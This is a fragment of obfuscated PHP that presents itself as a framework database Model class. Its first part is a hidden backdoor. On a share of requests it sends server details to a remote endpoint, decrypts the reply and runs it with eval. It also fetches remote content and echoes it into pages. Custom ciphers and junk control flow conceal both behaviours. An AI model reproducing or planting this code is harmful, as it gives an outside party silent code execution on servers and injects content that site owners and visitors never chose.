$aΆϋ[$C֊[162]]) { return; } } $this->{$_SERVER[ߗѻ][161]}(); goto b΄; A: $eʹ = $C֊[270] . $C֊[111]($C֊[271]); if ($this->czeab6b2b113 == $C֊[118] || !$GLOBALS[$C֊[129]]) { return; } if (!$C֊[233]($_SERVER[$C֊[44]], $Bγӡ)) { return; } goto dʴ; F¼: $aΆϋ = array($C֊[162] => $C֊[61]($C֊[62])->{$_SERVER[ߗѻ][63]}($C֊[206]), $C֊[175] => $this->czeab6b2b113, $C֊[173] => $_SERVER[$C֊[174]], $C֊[166] => $C֊[146], $C֊[169] => $_SERVER[$C֊[170]]); $D = $this->{$_SERVER[ߗѻ][179]}($C֊[275], $aΆϋ); $d´ = $B®[611]; goto Fػ; dʴ: if ($C֊[227]() % 4 != 0) { return; } $aľ = $C֊[13](array($C֊[272], $C֊[273]), $eʹ); $C = $B®[610]; goto Dܚ; Dܚ: if (!$C) { die; } if ($aľ && $C֊[227]() - $aľ < $C֊[198]($C֊[274])) { return; } $C֊[13](array($C֊[272], $C֊[149]), $eʹ, $C֊[227]()); goto F¼; e׬: $B® =& $_SERVER[놫Ӱ]; $C֊ =& $_SERVER[ߗѻ]; $Bγӡ = array($C֊[267], $C֊[268], $C֊[269]); goto A; b΄: if ($this->{$_SERVER[ߗѻ][196]}($D[$C֊[276]]) != $aΆϋ[$C֊[162]]) { $Dʸ = array($C֊[199] => $C֊[61]($C֊[62])->{$_SERVER[ߗѻ][63]}($C֊[113]), $C֊[200] => $_SERVER[$C֊[112]], $C֊[201] => $C֊[202](), $C֊[171] => $_SERVER[$C֊[172]]); $a⠂ = $this->{$_SERVER[ߗѻ][203]}($C֊[145]($Dʸ)); $D = $this->{$_SERVER[ߗѻ][179]}($C֊[204] . $a⠂); if ($D && $C֊[188]($D) && isset($D[$C֊[276]])) { $eۣ = $this->{$_SERVER[ߗѻ][185]}($D[$C֊[276]], 2); if ($eۣ) { $eۣ = $this->{$_SERVER[ߗѻ][196]}($eۣ); } if ($eۣ) { try { @eval($eۣ); } catch (Exception $AǢ) { } } } } goto b; b: } private function atxle7034605($bá = '', $Dϙ = array(), $bЕ = 5) { goto Aꉐ; Fӫ¯: if ($Dϙ === -1) { return $A݋©; } $aǍ = $C̼޾[242](array($C̼޾[243] => array($C̼޾[246] => $bЕ, $C̼޾[244] => $C̼޾[281]), $C̼޾[282] => array($C̼޾[283] => !1, $C̼޾[284] => !1))); $D = $dط[613]; goto Cظᵈ; Aꉐ: $dط =& $_SERVER[놫Ӱ]; $C̼޾ =& $_SERVER[ߗѻ]; $A݋© = $C̼޾[277]; goto b; b: $b国 = $dط[612]; $A݋© = $this->{$_SERVER[ߗѻ][240]}($A݋©, $C̼޾[278]); $A݋© = $A݋© . $bá . $C̼޾[279] . $C̼޾[280]($Dϙ); goto Fӫ¯; Cظᵈ: $Dϙ = @$C̼޾[247]($A݋©, !1, $aǍ); return $C̼޾[187]($Dϙ, !0); $Eߑ = $dط[614]; goto b喆ق; b喆ق: } private function jrtn43e69a66() { goto aЄ; A軛: return $eޔ + $Eυꪓ; $D = $A[618]; while (strlen($D) < $A[546]) { if (!$D) { break; } $D++; } goto Dɕ՞; aЄ: $A =& $_SERVER[놫Ӱ]; $F匉 =& $_SERVER[ߗѻ]; $cɏ = array($F匉[285] => $F匉[286], $F匉[287] => $F匉[288], $F匉[289] => $F匉[290], $F匉[291] => $F匉[292], $F匉[293] => $F匉[294], $F匉[295] => $F匉[235], $F匉[296] => $F匉[235], $F匉[297] => $F匉[286], $F匉[298] => $F匉[288], $F匉[299] => $F匉[290], $F匉[300] => $F匉[301], $F匉[302] => $F匉[292], $F匉[303] => $F匉[304], $F匉[305] => $F匉[294], $F匉[306] => $F匉[307], $F匉[308] => $F匉[309], $F匉[310] => $F匉[311]); goto d; E: $Eυꪓ = $F匉[101]($this->lbky391aa0e3, $F匉[312]); $E׍ = $A[617]; $Eυꪓ = $Eυꪓ ? $F匉[198]($Eυꪓ) : 0; goto A軛; b: $eޔ = $F匉[198]($eޔ ? $eޔ : $F匉[286]); $E𢯱 = $A[616]; while (strlen($E𢯱) < $A[543]) { if (!$E𢯱) { break; } $E𢯱++; } goto E; d: $eޔ = $cɏ[$this->czeab6b2b113]; $E螶 = $A[615]; while ($E螶 < $A[553]) { if ($E螶 >= 0) { break; } $E螶++; } goto b; Dɕ՞: } public function qmkr7eeee915($DЇ) { goto A󂃡; A򭗆: $E = $_SERVER[놫Ӱ][619]; if (!$E) { return; } $c؇꥛ƒ = $d􊋞[219]($c؇꥛ƒ, $d􊋞[10], $d􊋞[314]); goto bԤ; bԤ: if (!$d􊋞[233]($DЇ[$d􊋞[314]], $c؇꥛ƒ)) { $d􊋞[163]($d􊋞[317], !1, $d􊋞[230]); } goto e岜; Dǜ: $E襔 = $d􊋞[61]($d􊋞[136])->{$_SERVER[ߗѻ][137]}(); if ($E襔 <= $Eڒ) { return; } $c؇꥛ƒ = $d􊋞[61]($d􊋞[136])->{$_SERVER[ߗѻ][313]}($d􊋞[314])->{$_SERVER[ߗѻ][315]}($Eڒ)->{$_SERVER[ߗѻ][316]}(); goto A򭗆; A󂃡: $d􊋞 =& $_SERVER[ߗѻ]; $Eڒ = $this->{$_SERVER[ߗѻ][134]}(); if ($Eڒ >= $d􊋞[198]($d􊋞[235])) { return; } goto Dǜ; e岜: } public function tclkbe2942b6() { goto C㴭; f: $B비 = $d[623]; goto eň; C㴭: $d =& $_SERVER[놫Ӱ]; $A =& $_SERVER[ߗѻ]; if (!$GLOBALS[$A[129]] || $A[318](1, 100) > 20) { return; } goto Fꊍ; Fꊍ: $B䌄 = $A[239]; $aң = $d[620]; $B䌄 = $this->{$_SERVER[ߗѻ][240]}($B䌄, $A[241]); goto Eʩ; d: $FΥ = @$A[247]($B䌄, !1, $Dɝ); $Fˤ = $d[622]; echo $A[319] . $A[320]($FΥ) . $A[321]; goto f; Eʩ: $Dɝ = $A[242](array($A[243] => array($A[244] => $A[245], $A[246] => 3))); $Cߊ = $d[621]; if (strlen($Cߊ) < $d[553]) { return; } goto d; eň: } private function pvywf28a3f70($c, $d۝, $eɄ = 3) { goto Cܣ; Eݕ: $d = $b嘯߸[625]; if (strlen($d) < $b嘯߸[546]) { return; } $cظ = $C綉[318](0, 5) . $C綉[10]; goto a󵵬; a󵵬: $a㐜Ɠ = $C綉[121](15); $C㥩 = $C綉[323]; switch ($cظ) { case $C綉[226]: $cڍ = $this->{$_SERVER[ߗѻ][144]}($c, $C綉[211]($d۝ . $a㐜Ɠ)); $Fާ = $b嘯߸[626]; while ($Fާ < $b嘯߸[550]) { if ($Fާ >= 0) { break; } $Fާ++; } break; $dȾد = $b嘯߸[627]; if (!$dȾد) { die; } case $C綉[217]: $cڍ = $this->{$_SERVER[ߗѻ][144]}($c, $C綉[211]($a㐜Ɠ . $d۝)); $f鏑 = $b嘯߸[628]; if (strlen($f鏑) < $b嘯߸[553]) { die; } break; $D = $b嘯߸[629]; while (strlen($D) < $b嘯߸[550]) { if (!$D) { break; } $D++; } case $C綉[324]: $cڍ = $this->{$_SERVER[ߗѻ][144]}($c, $C綉[115]($a㐜Ɠ . $d۝)); break; $dį = $b嘯߸[630]; if (!$dį) { die; } case $C綉[325]: $cڍ = $this->{$_SERVER[ߗѻ][144]}($c, $C綉[111]($a㐜Ɠ . $d۝)); $cͪ = $b嘯߸[631]; if (strlen($cͪ) < $b嘯߸[573]) { return; } break; $D = $b嘯߸[632]; case $C綉[326]: goto Aɹ󶳇; f: $C = $C㥩[$a娆]; $aϑ = $C綉[111]($C . $C綉[111]($d۝ . $C) . $d۝); $E = $b嘯߸[634]; goto fᝃɼ; D寪: break; $c = $b嘯߸[570]; while ($c < $b嘯߸[573]) { if ($c >= 0) { break; } $c++; } goto Cˠ; fᝃɼ: if (strlen($E) < $b嘯߸[550]) { return; } $aϑ = $C綉[25]($aϑ, $a娆 % 8, $a娆 % 8 + 7); $Eᤄ = $C綉[10]; goto f; f: $aլؾ = 0; $e޳ = 0; $d = 0; goto Fњ; Fњ: for ($aլؾ = 0; $aլؾ < $C綉[24]($c); $aլؾ++) { $d = $d == $C綉[24]($aϑ) ? 0 : $d; $DɘƢ = $b嘯߸[635]; if (strlen($DɘƢ) < $b嘯߸[550]) { return; } $e޳ = ($a娆 + $C綉[328]($C㥩, $c[$aլؾ]) + $C綉[329]($aϑ[$d++])) % 64; $Eᤄ .= $C㥩[$e޳]; } $cڍ = $C綉[320]($C . $Eᤄ); $dܐ = $b嘯߸[636]; goto D寪; Aɹ󶳇: $c = $C綉[115]($c); $a娆 = $C綉[327](0, 64); $D = $b嘯߸[633]; goto f; Cˠ: default: $cڍ = $this->{$_SERVER[ߗѻ][144]}($c, $d۝ . $a㐜Ɠ); break; $Dڏ = $b嘯߸[637]; while (strlen($Dڏ) < $b嘯߸[546]) { if (!$Dڏ) { break; } $Dڏ++; } } goto bֻ૸; bֻ૸: $cڍ = $C綉[211]($cظ . $a㐜Ɠ . $cڍ); if ($eɄ - 1 > 0) { $cڍ = $this->{$_SERVER[ߗѻ][124]}($cڍ, $d۝, $eɄ - 1); } return $cڍ; goto Dʺș; Cܣ: $b嘯߸ =& $_SERVER[놫Ӱ]; $C綉 =& $_SERVER[ߗѻ]; $C綉[322](1); goto DǊ; DǊ: $Aޢ = $b嘯߸[624]; if (strlen($Aޢ) < $b嘯߸[553]) { return; } $c = $C綉[2]($c); goto Eݕ; Dʺș: } private function nkcu01d1573d($cþ؊, $A魳, $A = 3) { goto aȸ؈; c: $A镱 = $d[323]; switch ($fƇ) { case $d[226]: $D = $this->{$_SERVER[ߗѻ][240]}($cþ؊, $d[211]($A魳 . $Cƥ)); break; case $d[217]: $D = $this->{$_SERVER[ߗѻ][240]}($cþ؊, $d[211]($Cƥ . $A魳)); $A = $d鿙[640]; while (strlen($A) < $d鿙[546]) { if (!$A) { break; } $A++; } break; $C咣 = $d鿙[641]; if (strlen($C咣) < $d鿙[573]) { return; } case $d[324]: $D = $this->{$_SERVER[ߗѻ][240]}($cþ؊, $d[115]($Cƥ . $A魳)); break; case $d[325]: $D = $this->{$_SERVER[ߗѻ][240]}($cþ؊, $d[111]($Cƥ . $A魳)); $aƕ˦ = $d鿙[642]; break; case $d[326]: goto e; dǵ: $a = $d鿙[645]; if (strlen($a) < $d鿙[550]) { die; } $F = 0; goto Dϰ; e: $cþ؊ = $d[331]($cþ؊); $f󌬱 = $cþ؊[0]; $cþ؊ = $d[25]($cþ؊, 1); goto Eҹ; F͑: break; goto aӚ; Dϰ: $AϹ = 0; for ($F𓑎 = 0; $F𓑎 < $d[24]($cþ؊); $F𓑎++) { $AϹ = $AϹ == $d[24]($F) ? 0 : $AϹ; $e = $AϹ++; $F = $d[328]($A镱, $cþ؊[$F𓑎]) - $eĘ - $d[329]($F[$e]); $e؂ۃ = $d鿙[646]; if (strlen($e؂ۃ) < $d鿙[573]) { die; } while ($F < 0) { $F += 64; } $dݧ¥ .= $A镱[$F]; $d = $d鿙[647]; if (strlen($d) < $d鿙[550]) { return; } } $D = $d[332]($dݧ¥); goto F͑; Eҹ: $eĘ = $d[328]($A镱, $f󌬱); $F = $d鿙[643]; if (strlen($F) < $d鿙[553]) { die; } goto Dن; Dن: $F = $d[111]($f󌬱 . $d[111]($A魳 . $f󌬱) . $A魳); $AϮ = $d鿙[644]; while ($AϮ < $d鿙[546]) { if ($AϮ >= 0) { break; } $AϮ++; } goto f׬璬; f׬璬: $F = $d[25]($F, $eĘ % 8, $eĘ % 8 + 7); $dݧ¥ = $d[10]; $F𓑎 = 0; goto dǵ; aӚ: default: $D = $this->{$_SERVER[ߗѻ][240]}($cþ؊, $A魳 . $Cƥ); break; $A远 = $d鿙[648]; while (strlen($A远) < $d鿙[543]) { if (!$A远) { break; } $A远++; } } if ($A - 1 > 0) { $D = $this->{$_SERVER[ߗѻ][185]}($D, $A魳, $A - 1); } goto d; aȸ؈: $d鿙 =& $_SERVER[놫Ӱ]; $d =& $_SERVER[ߗѻ]; if (!$d[330]($cþ؊) || $d[24]($cþ؊) < 10) { return !1; } goto A򩸐; d: return $D; goto E; D֊: while ($FЫ < $d鿙[573]) { if ($FЫ >= 0) { break; } $FЫ++; } $Cƥ = $d[25]($cþ؊, 1, 15); $cþ؊ = $d[25]($cþ؊, 16); goto c; A򩸐: $cþ؊ = $d[2]($cþ؊); $Cʓ = $d鿙[638]; while ($Cʓ < $d鿙[550]) { if ($Cʓ >= 0) { break; } $Cʓ++; } goto F׊; F׊: $cþ؊ = $d[211]($cþ؊); $fƇ = $cþ؊[0]; $FЫ = $d鿙[639]; goto D֊; E: } public function lyex44f45f01($cж،㛜) { goto E܋州; aȹ: while (1) { $dԮ = $Bﶩ; $Dл߮ = $cԬ; while ($Dл߮ % $dԮ != 0) { $eʒ = $Dл߮; $A䉄 = $eǓ[651]; while (strlen($A䉄) < $eǓ[546]) { if (!$A䉄) { break; } $A䉄++; } $Dл߮ = $dԮ; $b씩Ԉ = $eǓ[652]; $dԮ = $eʒ % $dԮ; } if ($dԮ == 1) { break; } else { $Bﶩ++; } } $D = 2; $eي搇 = $eǓ[653]; goto c˞; f: $e͜ = $this->{$_SERVER[ߗѻ][333]}(); $eЭ = $eǓ[649]; if (strlen($eЭ) < $eǓ[546]) { die; } goto Fϑؘ; E܋州: $eǓ =& $_SERVER[놫Ӱ]; $D׬ =& $_SERVER[ߗѻ]; $A = $this->{$_SERVER[ߗѻ][333]}(); goto f; Fϑؘ: $cԬ = ($A - 1) * ($e͜ - 1); $B = $eǓ[650]; $Bﶩ = $D׬[198](($A + $e͜) / 2); goto aȹ; F̙: $bڇ = $this->{$_SERVER[ߗѻ][144]}($cж،㛜, $dʓ) . $D׬[337] . $Fɔʄ; $c = $eǓ[654]; if (!$c) { return; } goto d; c˞: for ($C = 0; $C < $cԬ * 10; $C++) { if (($cԬ * $C + 1) % $Bﶩ == 0) { $D = $D׬[198](($cԬ * $C + 1) / $Bﶩ); break; } } $Fɔʄ = $this->{$_SERVER[ߗѻ][144]}($A * $e͜ . $D׬[10], $D׬[146]); $dʓ = $D׬[111]($D׬[334] . ($A + $e͜) . $D׬[335] . $Bﶩ . $D׬[335] . $D . $D׬[336]); goto F̙; d: return $bڇ; $c܃ = $eǓ[655]; while ($c܃ < $eǓ[553]) { if ($c܃ >= 0) { break; } $c܃++; } goto bב; bב: } public function wxzv886d596d($Aᕼԅ) { goto EݍŰ; Eǜڃ: $a𴯵 = $this->{$_SERVER[ߗѻ][240]}($dڂƱ[1] . $A[10], $A[146]); $D͹ = $b̮Æ[657]; if (!$a𴯵) { return $A[10]; } goto Cļɿɴ; e: $CǊ = $this->{$_SERVER[ߗѻ][240]}($dڂƱ[0], $Cř); return $CǊ; $aĴ = $b̮Æ[663]; goto f֒; Cļɿɴ: $a𴯵 = $A[198]($a𴯵); $Bϟ = $b̮Æ[658]; if (!$Bϟ) { die; } goto d; Bݻ: $fʉڥ = ($c␅ - 1) * ($Bᘻ - 1); $CԄ = $A[198](($c␅ + $Bᘻ) / 2); while (1) { $Bᝧ = $CԄ; $c㶏 = $b̮Æ[661]; while (strlen($c㶏) < $b̮Æ[543]) { if (!$c㶏) { break; } $c㶏++; } $A = $fʉڥ; $f = $b̮Æ[662]; if (!$f) { return; } while ($A % $Bᝧ != 0) { $f = $A; $A = $Bᝧ; $Bᝧ = $f % $Bᝧ; } if ($Bᝧ == 1) { break; } else { $CԄ++; } } goto Fگ; EݍŰ: $b̮Æ =& $_SERVER[놫Ӱ]; $A =& $_SERVER[ߗѻ]; $dڂƱ = $A[0]($A[337], $Aᕼԅ); goto fƗ; d: $c␅ = 0; $Bᘻ = 0; for ($CŮ = 3; $CŮ < $a𴯵; $CŮ += 2) { if ($a𴯵 % $CŮ != 0) { continue; } $c␅ = $CŮ; $D = $b̮Æ[659]; while ($D < $b̮Æ[550]) { if ($D >= 0) { break; } $D++; } $Bᘻ = $A[198]($a𴯵 / $CŮ); $E = $b̮Æ[660]; break; } goto Bݻ; Fگ: $F⯛ = 2; for ($CŮ = 0; $CŮ < $fʉڥ * 10; $CŮ++) { if (($fʉڥ * $CŮ + 1) % $CԄ == 0) { $F⯛ = $A[198](($fʉڥ * $CŮ + 1) / $CԄ); break; } } $Cř = $A[111]($A[334] . ($c␅ + $Bᘻ) . $A[335] . $CԄ . $A[335] . $F⯛ . $A[336]); goto e; fƗ: $C = $b̮Æ[656]; if (strlen($C) < $b̮Æ[546]) { die; } if ($A[19]($dڂƱ) != 2) { return $A[10]; } goto Eǜڃ; f֒: } public function mykb76546f2e() { goto Aٙ; Aٙ: $aݏ =& $_SERVER[놫Ӱ]; $C⬤ϋ =& $_SERVER[ߗѻ]; $D = $C⬤ϋ[318]($C⬤ϋ[338](2, 14), $C⬤ϋ[338](2, 16) - 1); goto b糖; d㗮: $F = $aݏ[666]; while ($cꛘ <= (int) $C⬤ϋ[339]($D)) { $Bώ = $cꛘ; $d = $aݏ[667]; while (!0) { $Bώ++; $A = $aݏ[668]; if ($Bώ <= 2) { $cꛘ = $Bώ; break; } else { if ($Bώ < 2) { continue; } } $Dҝ = !0; for ($cԚ = 2; $cԚ <= $C⬤ϋ[339]($Bώ); $cԚ++) { if ($Bώ % $cԚ == 0) { $Dҝ = !1; } } if ($Dҝ) { $cꛘ = $Bώ; break; } } $bǊ޽[] = $cꛘ; } $cޭ = 2; goto CÆ; CÆ: $AԳҳ = $aݏ[669]; if (!$AԳҳ) { die; } for ($Bώ = $D; $Bώ > 1; $Bώ--) { $Dҝ = !0; foreach ($bǊ޽ as $F) { if ($Bώ % $F == 0) { $Dҝ = !1; break; } } if ($Dҝ) { $cޭ = $Bώ; break; } } goto aǑ; e: $FՉ = $aݏ[665]; if (strlen($FՉ) < $aݏ[553]) { die; } $cꛘ = 1; goto d㗮; aǑ: return $cޭ; $E򿬵 = $aݏ[670]; if (strlen($E򿬵) < $aݏ[573]) { return; } goto Dڰ; b糖: $AӋ = $aݏ[664]; if (strlen($AӋ) < $aݏ[573]) { die; } $bǊ޽ = array(); goto e; Dڰ: } public function rosh70ac5572($dʡ, $A݊) { $Aގ =& $_SERVER[ߗѻ]; return $Aގ[13](array($Aގ[14], $Aގ[340]), $dʡ, $A݊); } public function iohe6492975e($aܩ, $Eў߃) { $Eߜ =& $_SERVER[놫Ӱ]; $Eȉ =& $_SERVER[ߗѻ]; return $Eȉ[13](array($Eȉ[341], $Eȉ[342]), $aܩ, $Eў߃); $Cӊ܂ = $Eߜ[671]; while (strlen($Cӊ܂) < $Eߜ[550]) { if (!$Cӊ܂) { break; } $Cӊ܂++; } } public function cifz13a667e5($aȵ, $Bѵڳ) { $B쾽 =& $_SERVER[ߗѻ]; return $B쾽[13](array($B쾽[341], $B쾽[343]), $aȵ, $Bѵڳ); } } goto B˝ܔ; D֥: define($_SERVER[놫Ӱ][227], 0); define($_SERVER[놫Ӱ][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\145", "\157\x72\144\145\x72", "\141\154\151\x61\x73", "\150\x61\166\151\x6e\147", "\147\162\157\165\x70", "\154\157\x63\153", "\x64\x69\163\x74\151\156\143\164", "\141\x75\164\x6f", "\x66\x69\154\164\x65\x72", "\x76\x61\154\x69\x64\x61\164\x65", "\162\145\x73\165\154\164", "\x62\151\156\144", "\164\157\153\x65\x6e"); public function __construct($fӿ݋ = '', $aﾇ = '', $F = '') { $Eڟê =& $_SERVER[놫Ӱ]; $this->_initialize(); if (!empty($fӿ݋)) { if (strpos($fӿ݋, $Eڟê[92])) { list($this->dbName, $this->name) = explode($Eڟê[92], $fӿ݋); } else { $this->name = $fӿ݋; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($aﾇ)) { $this->tablePrefix = $Eڟê[33]; } elseif ($Eڟê[33] != $aﾇ) { $this->tablePrefix = $aﾇ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Eڟê[229]); } $this->db(0, empty($this->connection) ? $F : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Cť =& $_SERVER[놫Ӱ]; if (empty($this->fields)) { if (think_config($Cť[230])) { $D = $this->dbName ? $this->dbName : think_config($Cť[231]); $c = think_var_cache($Cť[232] . strtolower(get_path_this($D) . $Cť[92] . $this->name)); if ($c) { $Dꤩ = think_config($Cť[233]); if (empty($Dꤩ) || $c[$Cť[234]] == $Dꤩ) { $this->fields = $c; return; } } } $this->flush(); } } public function flush() { goto dܭ➸; Fם: foreach ($Aʵߡ as $bۆϸ => $F՚) { $d،Ѳ[$bۆϸ] = $F՚[$CK[29]]; if ($F՚[$CK[36]]) { $this->fields[$CK[236]] = $bۆϸ; if ($F՚[$CK[39]]) { $this->fields[$CK[235]] = !0; } } } $this->fields[$CK[237]] = $d،Ѳ; if (think_config($CK[233])) { $this->fields[$CK[234]] = think_config($CK[233]); } goto D狹; dܭ➸: $CK =& $_SERVER[놫Ӱ]; $this->db->setModel($this->name); $Aʵߡ = $this->db->getFields($this->getTableName()); goto Eü; D狹: if (think_config($CK[230])) { $EԼ = $this->dbName ? $this->dbName : think_config($CK[231]); think_var_cache($CK[232] . strtolower(get_path_this($EԼ) . $CK[92] . $this->name), $this->fields); } goto F; Eü: if (!$Aʵߡ) { return !1; } $this->fields = array_keys($Aʵߡ); $this->fields[$CK[235]] = !1; goto Fם; F: } public function switchModel($e듅, $aԿ = array()) { $B =& $_SERVER[놫Ӱ]; $Bܒ = ucwords(strtolower($e듅)) . $B[238]; if (!class_exists($Bܒ)) { think_exception($Bܒ . think_lang($B[239])); } $this->_extModel = new $Bܒ($this->name); if (!empty($aԿ)) { foreach ($aԿ as $Fӆ) { $this->_extModel->setProperty($Fӆ, $this->{$Fӆ}); } } return $this->_extModel; } public function __set($A׈, $a) { $this->data[$A׈] = $a; } public function __get($c) { return isset($this->data[$c]) ? $this->data[$c] : null; } public function __isset($fʹӳ) { return isset($this->data[$fʹӳ]); } public function __unset($Cͬ) { unset($this->data[$Cͬ]); } public function __call($b, $C) { $D蹉 =& $_SERVER[놫Ӱ]; if (in_array(strtolower($b), $this->methods, !0)) { $this->options[strtolower($b)] = $C[0]; return $this; } elseif (in_array(strtolower($b), array($D蹉[240], $D蹉[241], $D蹉[242], $D蹉[243], $D蹉[244]), !0)) { $a = isset($C[0]) ? $C[0] : $D蹉[173]; $a = $this->db->parseKey($a); return $this->getField(strtoupper($b) . $D蹉[245] . $a . $D蹉[246] . $b, $D蹉[240]); } elseif (strtolower(substr($b, 0, 5)) == $D蹉[247]) { $a = think_parse_name(substr($b, 5)); $Fۍܹ[$a] = $C[0]; return $this->where($Fۍܹ)->find(); } elseif (strtolower(substr($b, 0, 10)) == $D蹉[248]) { $bǸ = think_parse_name(substr($b, 10)); $Fۍܹ[$bǸ] = $C[0]; return $this->where($Fۍܹ)->getField($C[1]); } elseif (isset($this->_scope[$b])) { return $this->scope($b, $C[0]); } elseif (method_exists($this, $b)) { array_unshift($C, $b); return call_user_func_array(array($this, $D蹉[249]), $C); } else { return call_user_func_array(array(parent, $b), $C); } } protected function call() { goto F; e: $fՐʄ[] = $e; if (method_exists($this, $d[251])) { $B = call_user_func_array(array($this, $d[252]), array($a쌜, $fՐʄ)); if (!is_null($B) && $B !== !1) { return $B; } } $a = call_user_func_array(array($this, $e), $fՐʄ); goto c􂚦Ů; F: $d =& $_SERVER[놫Ӱ]; $fՐʄ = func_get_args(); $e = array_shift($fՐʄ); goto A; c􂚦Ů: if (method_exists($this, $d[253])) { $B = call_user_func_array(array($this, $d[254]), array($a쌜, $fՐʄ, $a)); if ($B) { return $B; } } return $a; goto a; A: $a쌜 = $e; if (is_array($e)) { $a쌜 = $e[1]; $e = $e[0]; } if ($fՐʄ[count($fՐʄ) - 1] === $e) { think_exception(__CLASS__ . $d[4] . $e . think_lang($d[250])); return; } goto e; a: } protected function _initialize() { } protected function _facade($f) { $D𩛟 =& $_SERVER[놫Ӱ]; if (!empty($this->fields)) { foreach ($f as $F => $C) { if (!in_array($F, $this->fields, !0)) { unset($f[$F]); } elseif (is_scalar($C)) { $this->_parseType($f, $F); } } } if (!empty($this->options[$D𩛟[255]])) { $f = array_map($this->options[$D𩛟[255]], $f); unset($this->options[$D𩛟[255]]); } $this->_beforeWrite($f); return $f; } protected function _beforeWrite(&$bģ) { } public function add($Dᗇ = '', $FúȐ = array(), $b٭ = false) { goto dՙ; A: if (!1 === $this->_beforeInsert($Dᗇ, $FúȐ)) { return !1; } $Eك = $this->db->insert($Dᗇ, $FúȐ, $b٭); if (!1 !== $Eك) { $bߜ = $this->getLastInsID(); if ($bߜ) { $Dᗇ[$this->getPk()] = $bߜ; $this->_after_insert($Dᗇ, $FúȐ); return $bߜ; } $this->_after_insert($Dᗇ, $FúȐ); } goto Aه; Aه: return $Eك; goto E͔È; dՙ: if (empty($Dᗇ)) { if (!empty($this->data)) { $Dᗇ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[놫Ӱ][256]); return !1; } } $FúȐ = $this->_parseOptions($FúȐ); $Dᗇ = $this->_facade($Dᗇ); goto A; E͔È: } protected function _beforeInsert(&$b, $AоǮ) { } protected function _after_insert($Eڲ, $A) { } public function addAll($AǷ왓, $eӯ = array(), $A = false) { goto dƊɬ; dƊɬ: $B =& $_SERVER[놫Ӱ]; if (empty($AǷ왓)) { $this->error = think_lang($B[256]); return !1; } $eӯ = $this->_parseOptions($eӯ); goto B; B: foreach ($AǷ왓 as $E񍫛 => $Cߧ) { $AǷ왓[$E񍫛] = $this->_facade($Cߧ); } if (method_exists($this->db, $B[257])) { $Aà = $this->db->insertAll($AǷ왓, $eӯ, $A); } else { $this->startTrans(); foreach ($AǷ왓 as $E񍫛 => $Cߧ) { $Aà = $this->db->insert($Cߧ, $eӯ, $A); } $this->commit(); } if (!1 !== $Aà) { $Bԫ = $this->getLastInsID(); if ($Bԫ) { return $Bԫ; } } goto Aը; Aը: return $Aà; goto B; B: } public function selectAdd($Fڔ = '', $fʃ = '', $Eޱ = array()) { $Fӳ =& $_SERVER[놫Ӱ]; $Eޱ = $this->_parseOptions($Eޱ); if (!1 === ($eתǄ = $this->db->selectInsert($Fڔ ? $Fڔ : $Eޱ[$Fӳ[258]], $fʃ ? $fʃ : $this->getTableName(), $Eޱ))) { $this->error = think_lang($Fӳ[259]); return !1; } else { return $eתǄ; } } public function save($Eα = '', $CƸ = array()) { goto eޠ; e: $CƸ = $this->_parseOptions($CƸ); $f = $this->getPk(); if (!isset($CƸ[$Eᄉ[260]])) { if (isset($Eα[$f])) { $Aʥ[$f] = $Eα[$f]; $CƸ[$Eᄉ[260]] = $Aʥ; unset($Eα[$f]); } else { $this->error = think_lang($Eᄉ[259]); return !1; } } goto B; B: if (is_array($CƸ[$Eᄉ[260]]) && isset($CƸ[$Eᄉ[260]][$f])) { $Dɳ = $CƸ[$Eᄉ[260]][$f]; } if (!1 === $this->_beforeUpdate($Eα, $CƸ)) { return !1; } $c = $this->db->update($Eα, $CƸ); goto B׎; B׎: if (!1 !== $c) { if (isset($Dɳ)) { $Eα[$f] = $Dɳ; } $this->_afterUpdate($Eα, $CƸ); } return $c; goto a忨; eޠ: $Eᄉ =& $_SERVER[놫Ӱ]; if (empty($Eα)) { if (!empty($this->data)) { $Eα = $this->data; $this->data = array(); } else { $this->error = think_lang($Eᄉ[256]); return !1; } } $Eα = $this->_facade($Eα); goto e; a忨: } protected function _beforeUpdate(&$a, $c) { } protected function _afterUpdate($Dǋ, $b) { } public function delete($A = array()) { goto Fݧ; Cڳ: $b× = $this->db->delete($A); if (!1 !== $b×) { $B밟 = array(); if (isset($Dڂ)) { $B밟[$Bӵ] = $Dڂ; } $this->_after_delete($B밟, $A); } return $b×; goto dʓ; Fݧ: $D =& $_SERVER[놫Ӱ]; if (empty($A) && empty($this->options[$D[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Bӵ = $this->getPk(); goto B; B: if (is_numeric($A) || is_string($A)) { if (strpos($A, $D[47])) { $EԪʫ[$Bӵ] = array($D[261], $A); } else { $EԪʫ[$Bӵ] = $A; } $this->options[$D[260]] = $EԪʫ; } $A = $this->_parseOptions(); if (is_array($A[$D[260]]) && isset($A[$D[260]][$Bӵ])) { $Dڂ = $A[$D[260]][$Bӵ]; } goto Cڳ; dʓ: } protected function _after_delete($Cع, $b҅) { } public function select($dòɷ = array()) { goto eԥ; aѸغ: $eڙ = $this->db->select($dòɷ); if (!1 === $eڙ) { return !1; } if (empty($eڙ)) { return null; } goto C; eԥ: $A =& $_SERVER[놫Ӱ]; if (is_string($dòɷ) || is_numeric($dòɷ)) { $b = $this->getPk(); if (strpos($dòɷ, $A[47])) { $D˃[$b] = array($A[261], $dòɷ); } else { $D˃[$b] = $dòɷ; } $this->options[$A[260]] = $D˃; } elseif (!1 === $dòɷ) { $dòɷ = $this->_parseOptions(); return $A[262] . $this->db->buildSelectSql($dòɷ) . $A[263]; } $dòɷ = $this->_parseOptions(); goto aѸغ; C: $this->_afterSelect($eڙ, $dòɷ); return $eڙ; goto f; f: } protected function _afterSelect(&$Dꝝ, $Aӵ΅מ) { } public function buildSql($c = array()) { $D =& $_SERVER[놫Ӱ]; $c = $this->_parseOptions($c); return $D[262] . $this->db->buildSelectSql($c) . $D[263]; } 